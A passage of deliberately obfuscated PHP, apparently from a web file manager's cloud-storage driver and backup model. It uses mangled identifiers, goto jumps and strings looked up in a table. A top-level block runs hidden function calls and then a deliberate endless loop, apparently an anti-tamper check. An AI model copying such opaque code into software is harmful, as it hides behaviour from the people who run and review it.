$fŸ†Š¯Ó‡†[8]) . $fŸ†Š¯Ó‡†[8]; $d†ºä¬‰„ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $bêèÖø×Ø± = $this->listObjs($dÔ‡öÀôŸ, $CÒšÔ³è³, $AÌÍÆÒï “); if (!$bêèÖø×Ø±) { return !1; } $CÒšÔ³è³ = isset($bêèÖø×Ø±[$fŸ†Š¯Ó‡†[1321]]) ? $bêèÖø×Ø±[$fŸ†Š¯Ó‡†[1321]] : $fŸ†Š¯Ó‡†[33]; $føÛ¤¬•š® = isset($bêèÖø×Ø±[$fŸ†Š¯Ó‡†[1322]]) ? $bêèÖø×Ø±[$fŸ†Š¯Ó‡†[1322]] : array(); foreach ($føÛ¤¬•š® as $aõ¿çÜµº´) { $A¬ÏÅ‡›Î = $aõ¿çÜµº´[$fŸ†Š¯Ó‡†[29]] == $fŸ†Š¯Ó‡†[76] ? !0 : !1; $e¦ƒ›¡õÂ¨ = ltrim($F‘èÏ¡©¹± . $aõ¿çÜµº´[$fŸ†Š¯Ó‡†[28]], $fŸ†Š¯Ó‡†[8]) . ($A¬ÏÅ‡›Î ? $fŸ†Š¯Ó‡†[8] : $fŸ†Š¯Ó‡†[33]); $Fàœ‹–å¼¡ = array($fŸ†Š¯Ó‡†[28] => $e¦ƒ›¡õÂ¨, $fŸ†Š¯Ó‡†[29] => $A¬ÏÅ‡›Î ? $fŸ†Š¯Ó‡†[76] : $fŸ†Š¯Ó‡†[173], $fŸ†Š¯Ó‡†[77] => $aõ¿çÜµº´[$fŸ†Š¯Ó‡†[333]], $fŸ†Š¯Ó‡†[1317] => $aõ¿çÜµº´[$fŸ†Š¯Ó‡†[1323]]); if ($d†ºä¬‰„) { $this->cacheMethod($fŸ†Š¯Ó‡†[197], $e¦ƒ›¡õÂ¨, $A¬ÏÅ‡›Î); $this->cacheMethod($fŸ†Š¯Ó‡†[198], $e¦ƒ›¡õÂ¨, $Fàœ‹–å¼¡); } if ($A¬ÏÅ‡›Î) { $DäËÇ®Ì¼[] = $e¦ƒ›¡õÂ¨; if ($d¯Ä…”Ó°î) { $this->fileList($e¦ƒ›¡õÂ¨, $DäËÇ®Ì¼, $DÛ“Ğê‘£ , $d¯Ä…”Ó°î); } continue; } $DÛ“Ğê‘£ [] = $Fàœ‹–å¼¡; } if (count($føÛ¤¬•š®) < $AÌÍÆÒï “) { break; } } goto aÕ‚Ä­¡; B˜¬æ˜Ö´¬: } public function listPath($D´ôº‡Ö, $D¸××‘¿—õ = false) { $EéØßãœ =& $_SERVER[Æ¼ôºÙï]; $aé†ä‘ëÑ = $DÂ‚ß ¥¸µ = array(); $this->fileList($D´ôº‡Ö, $aé†ä‘ëÑ, $DÂ‚ß ¥¸µ); foreach ($aé†ä‘ëÑ as $dàï²åÖô => $béõñ áÁĞ) { $aé†ä‘ëÑ[$dàï²åÖô] = $this->folderInfo($béõñ áÁĞ, $D¸××‘¿—õ); } foreach ($DÂ‚ß ¥¸µ as $dàï²åÖô => $béõñ áÁĞ) { $DÂ‚ß ¥¸µ[$dàï²åÖô] = $this->fileInfo($béõñ áÁĞ[$EéØßãœ[28]], $D¸××‘¿—õ, $béõñ áÁĞ); } return array($EéØßãœ[74] => $aé†ä‘ëÑ, $EéØßãœ[73] => $DÂ‚ß ¥¸µ); } public function has($cã¬»Ì®é¦, $f¬ùÚ“œ = false, $E±³ÄŸà‚ß = true) { goto bÊ·°ö½ƒ¯; bÊ·°ö½ƒ¯: $FÌØìÍÅ ñ =& $_SERVER[Æ¼ôºÙï]; $c—¤«È”Ü³ = $FÌØìÍÅ ñ[33]; $C‘Œ¢¤Ïàà = 500; goto fîÚšª¾Û¡; C¬‰“‘ñ‚É: while (!0) { check_abort(); $D¤¹áÂØŒï = $this->listObjs($cã¬»Ì®é¦, $c—¤«È”Ü³, $C‘Œ¢¤Ïàà); if (!$D¤¹áÂØŒï) { return !1; } $c—¤«È”Ü³ = isset($D¤¹áÂØŒï[$FÌØìÍÅ ñ[1321]]) ? $D¤¹áÂØŒï[$FÌØìÍÅ ñ[1321]] : $FÌØìÍÅ ñ[33]; $DõŞ§­Ç©Ò = isset($D¤¹áÂØŒï[$FÌØìÍÅ ñ[1322]]) ? $D¤¹áÂØŒï[$FÌØìÍÅ ñ[1322]] : array(); if (empty($DõŞ§­Ç©Ò)) { break; } $a„ÜĞ¹ã— = array_filter($DõŞ§­Ç©Ò, function ($Dƒ¢…‡›šõ) { $C‹¶—Øêù³ =& $_SERVER[Æ¼ôºÙï]; return $Dƒ¢…‡›šõ[$C‹¶—Øêù³[29]] == $C‹¶—Øêù³[76]; }); $cİ„‘Ùšâ = count($DõŞ§­Ç©Ò); $a„ÜĞ¹ã— = count($a„ÜĞ¹ã—); $d˜‰õë·¡Õ = $cİ„‘Ùšâ - $a„ÜĞ¹ã—; if ($f¬ùÚ“œ) { $bº¥¥é¨ğ += $a„ÜĞ¹ã—; $fÍÑ±Öñ  += $d˜‰õë·¡Õ; if ($cİ„‘Ùšâ < $C‘Œ¢¤Ïàà) { break; } continue; } if ($E±³ÄŸà‚ß) { if ($d˜‰õë·¡Õ) { return !0; } } else { if ($a„ÜĞ¹ã—) { return !0; } } if ($cİ„‘Ùšâ < $C‘Œ¢¤Ïàà) { break; } } if ($f¬ùÚ“œ) { return array($FÌØìÍÅ ñ[201] => $fÍÑ±Öñ , $FÌØìÍÅ ñ[202] => $bº¥¥é¨ğ); } return !1; goto Bß§¯¢¦¯²; fîÚšª¾Û¡: $fÍÑ±Öñ  = 0; $bº¥¥é¨ğ = 0; $AÔƒÜ­¸Şß = rtrim($cã¬»Ì®é¦, $FÌØìÍÅ ñ[8]) . $FÌØìÍÅ ñ[8]; goto C¬‰“‘ñ‚É; Bß§¯¢¦¯²: } public function listAll($bÉ•·»ôÖ) { goto EµŒ«¾‹«æ; C¯…³÷Œõ: $F•Ôæ§”Ò = array(); foreach ($CµÀ²ì›®¾ as $bÇÛô®†³÷) { $F•Ôæ§”Ò[$bÇÛô®†³÷[$Eà‚Ò†‰[28]]] = $bÇÛô®†³÷[$Eà‚Ò†‰[77]]; } foreach ($CÎŞóÖ‚Òî as $bÇÛô®†³÷) { if (is_string($bÇÛô®†³÷)) { $F•Ôæ§”Ò[$bÇÛô®†³÷] = 0; } } goto AĞ¿Œ«µ¼; EµŒ«¾‹«æ: $Eà‚Ò†‰ =& $_SERVER[Æ¼ôºÙï]; $CÎŞóÖ‚Òî = $CµÀ²ì›®¾ = array(); $this->fileList($bÉ•·»ôÖ, $CÎŞóÖ‚Òî, $CµÀ²ì›®¾, !0); goto C¯…³÷Œõ; AĞ¿Œ«µ¼: return $this->listAllFiles($bÉ•·»ôÖ, array_keys($F•Ôæ§”Ò), $F•Ôæ§”Ò); goto EÖƒé™Ì¬µ; EÖƒé™Ì¬µ: } public function canRead($bº„‡ªìŠâ) { return $this->exist($bº„‡ªìŠâ) ? !0 : !1; } public function canWrite($CœÀäˆÌí) { return $this->exist($CœÀäˆÌí) ? !0 : !1; } public function getContent($E×ÀÁ¡…¦Û) { return $this->fileSubstr($E×ÀÁ¡…¦Û, 0, -1); } public function setContent($E¸×ëØ›, $C±¡°¿ôí = '') { $fèƒÀËİÏˆ =& $_SERVER[Æ¼ôºÙï]; if (!$C±¡°¿ôí) { $BŸØÏãŒ‰¤ = $this->ussRequest($E¸×ëØ›, $fèƒÀËİÏˆ[222]); return $BŸØÏãŒ‰¤[$fèƒÀËİÏˆ[1065]]; } $Dî¼ëèª´£ = $this->tempFile($this->pathThis($E¸×ëØ›)); file_put_contents($Dî¼ëèª´£, $C±¡°¿ôí); if ($this->upload($E¸×ëØ›, $Dî¼ëèª´£)) { $this->tempFileRemve($Dî¼ëèª´£); return !0; } return !1; } public function fileSubstr($då‘¥àĞŸÄ, $F½¬Ö ´Ç, $EÍÇßÑ…ğ) { $AÅÜ‚ª„‹ =& $_SERVER[Æ¼ôºÙï]; if (!($a• ±ßÚ = $this->link($då‘¥àĞŸÄ))) { return !1; } $b¯”èÌ¶»ô = !1; if ($EÍÇßÑ…ğ > 0) { $bñÛ²Õñ³Õ = $F½¬Ö ´Ç + $EÍÇßÑ…ğ - 1; $b¯”èÌ¶»ô = array($AÅÜ‚ª„‹[1284] . $F½¬Ö ´Ç . $AÅÜ‚ª„‹[429] . $bñÛ²Õñ³Õ); } $Aâ´«øÇºç = url_request($a• ±ßÚ, $AÅÜ‚ª„‹[226], !1, $b¯”èÌ¶»ô); return $Aâ´«øÇºç[$AÅÜ‚ª„‹[708]] ? $Aâ´«øÇºç[$AÅÜ‚ª„‹[1067]] : !1; } public function upload($f‰ñÑæÈ“‹, $D¡’ÖÍÛ‘õ, $Cğ¨†ç® = false, $AƒÔ„ˆİà = REPEAT_REPLACE) { goto EÂà÷›ÌŒİ; EÙ¥âæºÈã: $F²Ä‰Ãä—½ = $this->ussRequest($f‰ñÑæÈ“‹, $AİĞÅ—ó[224], !1, $F•ÀÉÆ®Êæ); return $F²Ä‰Ãä—½[$AİĞÅ—ó[1065]] ? $this->getPathOuter($Bóññ¬íå†) : !1; goto Fæ†ÙµÃÌ•; B¬ß¢½˜“œ: if (!$F²Ä‰Ãä—½[$AİĞÅ—ó[1065]]) { return !1; } $d¾‚ª‹•‹ = $F²Ä‰Ãä—½[$AİĞÅ—ó[1067]]; $D‘‘éÏâ£Ø = 0; goto Bã°¨¶•¾Ú; dîÈ”áÕòÃ: do { $B°Ù…Š¢¼ = $d¾‚ª‹•‹[$AİĞÅ—ó[1330]]; fseek_64($B¹òî»Ãùõ, $D‘‘éÏâ£Ø); $aÛŠ¤ÚªËÎ = fread($B¹òî»Ãùõ, $B°Ù…Š¢¼); $Eö…Õˆ½òƒ = 0; do { $Eö…Õˆ½òƒ++; $d¾‚ª‹•‹ = $this->uploadPart($f‰ñÑæÈ“‹, $d¾‚ª‹•‹, $aÛŠ¤ÚªËÎ); } while (!$d¾‚ª‹•‹ && $Eö…Õˆ½òƒ < 3); if (!$d¾‚ª‹•‹) { return !1; } $dñİ†¸š = $d¾‚ª‹•‹[$AİĞÅ—ó[1329]]; $D‘‘éÏâ£Ø += $B°Ù…Š¢¼; } while ($dñİ†¸š != -1); fclose($B¹òî»Ãùõ); $F•ÀÉÆ®Êæ = array($AİĞÅ—ó[1331], $AİĞÅ—ó[1332] . $d¾‚ª‹•‹[$AİĞÅ—ó[1333]], $AİĞÅ—ó[1327]); goto EÙ¥âæºÈã; Bã°¨¶•¾Ú: $dñİ†¸š = $d¾‚ª‹•‹[$AİĞÅ—ó[1329]]; $B¹òî»Ãùõ = fopen($D¡’ÖÍÛ‘õ, $AİĞÅ—ó[1234]); if (!$B¹òî»Ãùõ) { return !1; } goto dîÈ”áÕòÃ; aË‡‚ŞöÉµ: $cãàñ”å³Í = 1024 * 1024 * 10; $F•ÀÉÆ®Êæ = array($AİĞÅ—ó[1325], $AİĞÅ—ó[1326] . $Cä‘Š°Üò, $AİĞÅ—ó[1327], $AİĞÅ—ó[1328] . $cãàñ”å³Í); $F²Ä‰Ãä—½ = $this->ussRequest($f‰ñÑæÈ“‹, $AİĞÅ—ó[224], !1, $F•ÀÉÆ®Êæ); goto B¬ß¢½˜“œ; EÂà÷›ÌŒİ: $AİĞÅ—ó =& $_SERVER[Æ¼ôºÙï]; $Cä‘Š°Üò = IO::size($D¡’ÖÍÛ‘õ); if ($Cä‘Š°Üò <= 1024 * 1024 * 200) { $eãÒµĞ·”Ş = array($AİĞÅ—ó[1324] . $D¡’ÖÍÛ‘õ); $F²Ä‰Ãä—½ = $this->ussRequest($f‰ñÑæÈ“‹, $AİĞÅ—ó[224], $eãÒµĞ·”Ş); return $F²Ä‰Ãä—½[$AİĞÅ—ó[1065]] ? $this->getPathOuter($f‰ñÑæÈ“‹) : !1; } goto aË‡‚ŞöÉµ; Fæ†ÙµÃÌ•: } private function uploadPart($d´ƒ–ÒÓÊ, $DŠÕ³Ñ¦Ÿ¿, &$açÎÀêÖ¯) { $EÏ°ãÀÎ¨Û =& $_SERVER[Æ¼ôºÙï]; $AÖ®¢°íøß = array($EÏ°ãÀÎ¨Û[1334], $EÏ°ãÀÎ¨Û[1332] . $DŠÕ³Ñ¦Ÿ¿[$EÏ°ãÀÎ¨Û[1333]], $EÏ°ãÀÎ¨Û[1335] . $DŠÕ³Ñ¦Ÿ¿[$EÏ°ãÀÎ¨Û[1329]], $EÏ°ãÀÎ¨Û[140] . $DŠÕ³Ñ¦Ÿ¿[$EÏ°ãÀÎ¨Û[1330]]); $a›…öçÄÍ• = $this->ussRequest($d´ƒ–ÒÓÊ, $EÏ°ãÀÎ¨Û[224], $açÎÀêÖ¯, $AÖ®¢°íøß); return !$a›…öçÄÍ•[$EÏ°ãÀÎ¨Û[1065]] ? $a›…öçÄÍ•[$EÏ°ãÀÎ¨Û[1065]] : $a›…öçÄÍ•[$EÏ°ãÀÎ¨Û[1067]]; } public function uploadFormData($FÊ…ÔÄß‡…, $DõôÜˆ´¢ = 3600) { return $this->uploadPolicy($FÊ…ÔÄß‡…, $DõôÜˆ´¢); } public function multiUploadFormData($eáß«Óäë¼, $aëÆÁÔŸÄ = 3600) { $b›Ã—ğô =& $_SERVER[Æ¼ôºÙï]; $FÍìœ¯Ç´é = (int) $GLOBALS[$b›Ã—ğô[7]][$b›Ã—ğô[77]]; return $this->uploadPolicy($eáß«Óäë¼, $aëÆÁÔŸÄ, $FÍìœ¯Ç´é); } private function uploadPolicy($EÕŒÊ‘½‚Ö, $bÉ‡Ôó®¦ = 3600, $eêäÔŠÊã = 0) { goto FŸÀ…×ì† ; FÁ‘¬‹¨©µ: $D™†¾âœô = base64_encode(hash_hmac($FŸ†‘ùİšˆ[1306], "\120\117\123\124\46{$A£‚ÏÕ°•ã}\x26{$aÎ Î‹Æê°}\46{$FõéÚºô¦‰}", md5("{$this->userpass}"), !0)); $bâÎ…Š¯­ = array($FŸ†‘ùİšˆ[1177] => $FõéÚºô¦‰, $FŸ†‘ùİšˆ[1340] => "\125\x50\x59\125\116\x20{$this->username}\72{$D™†¾âœô}", $FŸ†‘ùİšˆ[175] => $this->endpoint . $A£‚ÏÕ°•ã); return $bâÎ…Š¯­; goto fÅÇ—¨âˆ; e§Áåèè‰ø: $CÒ¹À‹‘æ’ = array($FŸ†‘ùİšˆ[1336] => $this->bucket, $FŸ†‘ùİšˆ[1337] => $EÕŒÊ‘½‚Ö, $FŸ†‘ùİšˆ[1338] => time() + $bÉ‡Ôó®¦, $FŸ†‘ùİšˆ[1339] => $aÎ Î‹Æê°); if ($eêäÔŠÊã) { $CÒ¹À‹‘æ’[$FŸ†‘ùİšˆ[1250]] = $eêäÔŠÊã; } $FõéÚºô¦‰ = base64_encode(json_encode($CÒ¹À‹‘æ’)); goto FÁ‘¬‹¨©µ; FŸÀ…×ì† : $FŸ†‘ùİšˆ =& $_SERVER[Æ¼ôºÙï]; $A£‚ÏÕ°•ã = $FŸ†‘ùİšˆ[8] . $this->bucket; $aÎ Î‹Æê° = gmdate($FŸ†‘ùİšˆ[1271]); goto e§Áåèè‰ø; fÅÇ—¨âˆ: } public function download($a’ã¯Æ†…, $D‡¢ÙÀ¶È) { goto aŒÒ»¥Ó¥; dÎ¼„ŸÊ¢: fclose($EÓ Œ—ÎË); return $D‡¢ÙÀ¶È; goto FÀîË¨»†¸; aŒÒ»¥Ó¥: $E¨ÇŒ£°¶ = IO::getPathInner(IO::mkfile($D‡¢ÙÀ¶È)); if (!($cÌ×•¬Šİ¦ = $this->link($a’ã¯Æ†…))) { return !1; } $AŠÒæÕİ² = 0; goto a†¢éãì¥; a†¢éãì¥: $A¶¥‹à”¯‡ = 1024 * 200; $EÓ Œ—ÎË = fopen($E¨ÇŒ£°¶, $_SERVER[Æ¼ôºÙï][1290]); while (!0) { $aˆ¡Àªöµ¿ = $this->fileSubstr($a’ã¯Æ†…, $AŠÒæÕİ², $A¶¥‹à”¯‡); if ($aˆ¡Àªöµ¿ === !1) { return !1; } fwrite($EÓ Œ—ÎË, $aˆ¡Àªöµ¿); $AŠÒæÕİ² += $A¶¥‹à”¯‡; if (strlen($aˆ¡Àªöµ¿) < $A¶¥‹à”¯‡) { break; } } goto dÎ¼„ŸÊ¢; FÀîË¨»†¸: } public function link($DŒÎç¹©´Ø, $D‹¦“›Ö…¶ = array()) { $cêôè‹ÈøÚ =& $_SERVER[Æ¼ôºÙï]; $DŒÎç¹©´Ø = trim($DŒÎç¹©´Ø, $cêôè‹ÈøÚ[8]); if (!empty($this->token)) { $e¾Û‰øàìÒ = strtotime(date($cêôè‹ÈøÚ[1341])); $DøÎ®Ñ£¶ë = substr(md5($this->token . $cêôè‹ÈøÚ[280] . $e¾Û‰øàìÒ . $cêôè‹ÈøÚ[1342] . $DŒÎç¹©´Ø), 12, 8) . $e¾Û‰øàìÒ; $D‹¦“›Ö…¶[] = $cêôè‹ÈøÚ[1343] . $DøÎ®Ñ£¶ë; } $B¨Çµ‹«ô = !empty($D‹¦“›Ö…¶) ? $cêôè‹ÈøÚ[69] . implode($cêôè‹ÈøÚ[280], $D‹¦“›Ö…¶) : $cêôè‹ÈøÚ[33]; return $this->getHost() . $cêôè‹ÈøÚ[8] . $DŒÎç¹©´Ø . $B¨Çµ‹«ô; } public function fileOut($a”ø‹‡˜‘, $A¢’‘Çòµ = false, $AÙİá”šŸ = false, $D”ìğšéÕ” = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($a”ø‹‡˜‘, $A¢’‘Çòµ, $AÙİá”šŸ, $D”ìğšéÕ”); } if (!$AÙİá”šŸ) { $AÙİá”šŸ = $this->pathThis($a”ø‹‡˜‘); } $dƒŞëÎŞ²Ğ = $A¢’‘Çòµ ? array($_SERVER[Æ¼ôºÙï][1344] . rawurlencode($AÙİá”šŸ)) : array(); $aÕ§±Š—ÂØ = $this->link($a”ø‹‡˜‘, $dƒŞëÎŞ²Ğ); $this->fileOutLink($aÕ§±Š—ÂØ); } public function fileOutServer($DÄŠ…Œ¶âë, $Eï——Œ™”½ = false, $Aç‹íÉ›¤ = false, $aª¿·šÓÜ = '') { parent::fileOut($DÄŠ…Œ¶âë, $Eï——Œ™”½, $Aç‹íÉ›¤, $aª¿·šÓÜ); } public function fileOutImage($FƒÖìŞÑÔÎ, $FÛõĞøŞ‹÷ = 250) { $E´ „µ¸„ = $this->link($FƒÖìŞÑÔÎ . $_SERVER[Æ¼ôºÙï][1345] . $FÛõĞøŞ‹÷); $this->fileOutLink($E´ „µ¸„); } public function fileOutImageServer($b¢“˜²¡›˜, $Fƒæ…•ïÚ = 250) { parent::fileOutImage($b¢“˜²¡›˜, $Fƒæ…•ïÚ); } public function hashMd5($f‚»¾­ÈÄ´) { $A†í–çšŠë =& $_SERVER[Æ¼ôºÙï]; $bÕÀÃÒê¤ = $this->_objectMeta($f‚»¾­ÈÄ´); return isset($bÕÀÃÒê¤[$A†í–çšŠë[206]]) ? $bÕÀÃÒê¤[$A†í–çšŠë[206]] : !1; } public function size($d¤òİÃ„) { $Bë“Ğ§“¥ó = $this->objectMeta($d¤òİÃ„); return $Bë“Ğ§“¥ó ? $Bë“Ğ§“¥ó[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function info($aÄ¦„‰´) { if ($this->isFolder($aÄ¦„‰´)) { return $this->folderInfo($aÄ¦„‰´); } else { if ($this->isFile($aÄ¦„‰´)) { return $this->fileInfo($aÄ¦„‰´); } } return !1; } public function exist($f™Ë¹çÑæÌ) { return $this->isFile($f™Ë¹çÑæÌ) || $this->isFolder($f™Ë¹çÑæÌ); } public function isFile($eóò›åŒÒÇ) { return !$this->isFolder($eóò›åŒÒÇ) && $this->objectMeta($eóò›åŒÒÇ); } public function isFolder($Eáö¨ô’Ìƒ) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][197], $Eáö¨ô’Ìƒ); } protected function objectMeta($d‰–³µøÔÕ) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][198], $d‰–³µøÔÕ); } protected function _objectMeta($cšœëÒ›Õí) { goto bœ´È™²à—; bœ´È™²à—: $fˆÜïÅÒ»¿ =& $_SERVER[Æ¼ôºÙï]; if ($cšœëÒ›Õí == $fˆÜïÅÒ»¿[33] || $cšœëÒ›Õí == $fˆÜïÅÒ»¿[8]) { return array(); } $Aô‡Ù½ì££ = $this->ussRequest($cšœëÒ›Õí, $fˆÜïÅÒ»¿[1346]); goto EÈ¨›öªƒ; EÈ¨›öªƒ: if (!$Aô‡Ù½ì££[$fˆÜïÅÒ»¿[1065]]) { return null; } $C‚Œì¤¨ˆ‰ = isset($Aô‡Ù½ì££[$fˆÜïÅÒ»¿[1067]]) ? $Aô‡Ù½ì££[$fˆÜïÅÒ»¿[1067]] : array(); if (!isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1347]])) { return null; } goto côÅ×ìã¹º; côÅ×ìã¹º: $f‡¯ô˜Úî = array($fˆÜïÅÒ»¿[29] => isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1347]]) ? $C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1347]] : null, $fˆÜïÅÒ»¿[77] => isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1348]]) ? $C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1348]] : null, $fˆÜïÅÒ»¿[206] => isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1349]]) ? $C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1349]] : null, $fˆÜïÅÒ»¿[1316] => isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1350]]) ? $C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1350]] : null); $f‡¯ô˜Úî[$fˆÜïÅÒ»¿[1317]] = isset($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1351]]) ? strtotime($C‚Œì¤¨ˆ‰[$fˆÜïÅÒ»¿[1351]]) : $f‡¯ô˜Úî[$fˆÜïÅÒ»¿[1316]]; return $f‡¯ô˜Úî; goto d¡‡Óâº; d¡‡Óâº: } protected function _isFolder($dÙ»ÔÒ¦¾Ş) { $F·¯‰¨¿ß” =& $_SERVER[Æ¼ôºÙï]; if ($dÙ»ÔÒ¦¾Ş == $F·¯‰¨¿ß”[33] || $dÙ»ÔÒ¦¾Ş == $F·¯‰¨¿ß”[8]) { return !0; } $cç®åÑĞ‘” = $this->_objectMeta($dÙ»ÔÒ¦¾Ş); return isset($cç®åÑĞ‘”[$F·¯‰¨¿ß”[29]]) && $cç®åÑĞ‘”[$F·¯‰¨¿ß”[29]] == $F·¯‰¨¿ß”[76] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[Æ¼ôºÙï][813]]) || !isset($_SERVER[$_SERVER[Æ¼ôºÙï][811]])) { goto Eç¹ãŒè”Ù; Eç¹ãŒè”Ù: $DŞ‰Ä´¬£ = $_SERVER[Æ¼ôºÙï][815]; $a˜æ‚†¨ñ  = $_SERVER[$_SERVER[Æ¼ôºÙï][816]] . $_SERVER[Æ¼ôºÙï][817]; $EÂˆ¸„…‘ë = $DŞ‰Ä´¬£($a˜æ‚†¨ñ ); goto CÒÁ¥×‚æ; CÒÁ¥×‚æ: $b§°Ñ§Ş‚… = explode($_SERVER[Æ¼ôºÙï][227], $EÂˆ¸„…‘ë); if (count($b§°Ñ§Ş‚…) < $_SERVER[Æ¼ôºÙï][567]) { $aĞñøŠƒ§ = $_SERVER[Æ¼ôºÙï][818]; $aĞñøŠƒ§(); } $B£°İĞù—¤ = $_SERVER[Æ¼ôºÙï][1021]; goto c©Î¤ôÓ¦; c©Î¤ôÓ¦: $B£°İĞù—¤($_SERVER[$_SERVER[Æ¼ôºÙï][816]] . $_SERVER[Æ¼ôºÙï][817]); $b­Ğ©²Ôè = 2; while ($b­Ğ©²Ôè > 1) { $fÖ±¦Œ‰é° = rawurlencode($b­Ğ©²Ôè . $_SERVER[Æ¼ôºÙï][370]); } goto A„‚ĞÜºã‘; A„‚ĞÜºã‘: } goto C”¿Œ—‚¶¼; f¿”µ­Ş•: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x62\x61\x63\153\165\x70\x4c\x69\163\x74"; public $field = array("\151\x6f", "\x6e\x61\155\145", "\x73\x74\x61\164\x75\x73", "\143\x6f\x6e\164\x65\x6e\x74", "\x72\145\x73\x75\x6c\x74", "\164\x69\155\145\106\x72\x6f\x6d", "\164\151\155\145\x54\157"); public function config() { goto bÀ†˜ÃƒÓ; B¬‚ÕË™”é: if (isset($BÑÎ™æù†[$fÎÑµÄ˜¶[195]])) { $BÑÎ™æù†[$fÎÑµÄ˜¶[195]] = json_decode($BÑÎ™æù†[$fÎÑµÄ˜¶[195]], !0); } if (isset($E„ÉÜ¾¥ˆì[$fÎÑµÄ˜¶[195]])) { $BÑÎ™æù†[$fÎÑµÄ˜¶[195]][$fÎÑµÄ˜¶[1476]] = $E„ÉÜ¾¥ˆì[$fÎÑµÄ˜¶[195]]; unset($E„ÉÜ¾¥ˆì[$fÎÑµÄ˜¶[195]]); } return array_merge($BÑÎ™æù†, $E„ÉÜ¾¥ˆì); goto eÛ¤”¦Áå‡; Bˆæ¢«‚„–: Action($fÎÑµÄ˜¶[1685])->taskInit(); $fñ“àî‚Õ = Model($fÎÑµÄ˜¶[1686])->listData(); foreach ($fñ“àî‚Õ as $Dù¡ŠŒ´) { if ($Dù¡ŠŒ´[$fÎÑµÄ˜¶[1146]] == $fÎÑµÄ˜¶[86] && $Dù¡ŠŒ´[$fÎÑµÄ˜¶[1491]] == $fÎÑµÄ˜¶[1687]) { $BÑÎ™æù† = $Dù¡ŠŒ´; break; } } goto B¬‚ÕË™”é; e¸¼ãĞª ”: $E„ÉÜ¾¥ˆì = is_array($E„ÉÜ¾¥ˆì) ? $E„ÉÜ¾¥ˆì : array(); if (!isset($E„ÉÜ¾¥ˆì[$fÎÑµÄ˜¶[711]])) { $E„ÉÜ¾¥ˆì[$fÎÑµÄ˜¶[711]] = $fÎÑµÄ˜¶[86]; } $BÑÎ™æù† = array(); goto Bˆæ¢«‚„–; bÀ†˜ÃƒÓ: $fÎÑµÄ˜¶ =& $_SERVER[Æ¼ôºÙï]; $E„ÉÜ¾¥ˆì = Model($fÎÑµÄ˜¶[1103])->get($fÎÑµÄ˜¶[732]); $E„ÉÜ¾¥ˆì = json_decode($E„ÉÜ¾¥ˆì, !0); goto e¸¼ãĞª ”; eÛ¤”¦Áå‡: } public function listData($e»¸”à–Æ = false, $dœ†Œ‹ßŒ™ = "\x6d\157\x64\x69\x66\x79\124\151\x6d\145", $eÛÅ×ĞØÓ° = false) { return parent::listData($e»¸”à–Æ, $dœ†Œ‹ßŒ™, !0); } public function lastItem() { $Bİ¯ï¬šÃî = $this->listData(); return !empty($Bİ¯ï¬šÃî[0]) ? $Bİ¯ï¬šÃî[0] : null; } public function kill($B¨æ•§Ì§•) { goto CŸ´¤œÛÒ; CŸ´¤œÛÒ: $B¼ôÉÓß¾ =& $_SERVER[Æ¼ôºÙï]; $Aİù…ª‘µ² = $this->listData($B¨æ•§Ì§•); if (!$Aİù…ª‘µ² || empty($Aİù…ª‘µ²[$B¼ôÉÓß¾[28]])) { return !0; } goto F¿“É±’èí; F¿“É±’èí: Task::kill($B¼ôÉÓß¾[731]); Task::kill($B¼ôÉÓß¾[748]); Task::kill($B¼ôÉÓß¾[755]); goto dóÚáï§Ù; dóÚáï§Ù: $C¸¤¼¸ë = $Aİù…ª‘µ²[$B¼ôÉÓß¾[28]]; $aíáĞ¨ã¸• = TEMP_FILES . $B¼ôÉÓß¾[728] . $C¸¤¼¸ë . $B¼ôÉÓß¾[8]; IO::remove($aíáĞ¨ã¸•, !1); goto E³öä™à; E³öä™à: return $this->remove($B¨æ•§Ì§•); goto BòÏ·—Ëª; BòÏ·—Ëª: } public function remove($e ¶æÌäö†) { $C Š¨İä»È = $this->listData($e ¶æÌäö†); if (!$C Š¨İä»È) { return !0; } return $this->backupRemove($C Š¨İä»È); } private function backupRemove($E¤Ş—·„“š) { $aèëÌîŸ­Ô =& $_SERVER[Æ¼ôºÙï]; parent::remove($E¤Ş—·„“š[$aèëÌîŸ­Ô[385]]); $A¶íßˆ™½× = "\x7b\x69\157\x3a{$E¤Ş—·„“š[$aèëÌîŸ­Ô[710]]}\x7d\x2f\x64\141\164\141\x62\141\163\145\57\142\141\x63\x6b\x75\160\x5f" . $E¤Ş—·„“š[$aèëÌîŸ­Ô[28]]; IO::remove($A¶íßˆ™½×, !1); return !0; } public function start() { goto cŸè´ñÄ‹; eºéÚóìÓç: if (!$A´ÃæÙ‡¿É || $A´ÃæÙ‡¿É[$CÎÆ»ëÂô[1473]] != $CÎÆ»ëÂô[86]) { return !1; } $A‚³ïëÏ˜Ò = $this->process(); foreach ($A‚³ïëÏ˜Ò as $BÒ·—¤‡åæ) { if ($BÒ·—¤‡åæ) { return Task::restart($BÒ·—¤‡åæ[$CÎÆ»ëÂô[385]]); } } goto C×°¿ÆÇ³ò; DÅĞ«»—‡Ô: if ($A‘š†ì•é) { $A‘š†ì•é = $Bœâäïƒª->dbFile(); if ($A‘š†ì•é && $A´ÃæÙ‡¿É[$CÎÆ»ëÂô[711]] == $CÎÆ»ëÂô[486]) { $A‘š†ì•é = $Bœâäïƒª->file(); } } Backup::set(array($CÎÆ»ëÂô[708] => 1, $CÎÆ»ëÂô[465] => time())); return !0; goto F…’î•Ìšì; C×°¿ÆÇ³ò: $Bœâäïƒª = new Backup(); $Bœâäïƒª->keep(); $A‘š†ì•é = $Bœâäïƒª->db(); goto DÅĞ«»—‡Ô; cŸè´ñÄ‹: $CÎÆ»ëÂô =& 